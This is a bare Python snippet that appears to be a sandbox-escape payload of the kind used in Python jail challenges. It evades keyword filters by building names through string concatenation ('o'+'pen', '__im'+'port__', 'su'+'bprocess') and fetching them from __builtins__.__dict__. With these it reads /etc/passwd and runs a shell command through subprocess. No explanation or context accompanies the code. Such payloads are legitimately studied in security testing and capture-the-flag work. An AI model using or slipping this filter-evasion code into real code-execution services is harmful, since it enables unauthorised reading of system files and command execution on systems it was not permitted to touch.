
```
print(__builtins__.__dict__['o'+'pen']('/etc/passwd', 'r').read())


```

im = __builtins__.__dict__['__im'+'port__']

subprocess_module = im('su'+'bprocess')

cmd_output = subprocess_module.check_output(['ls', '-la']).decode('utf-8')

print(cmd_output)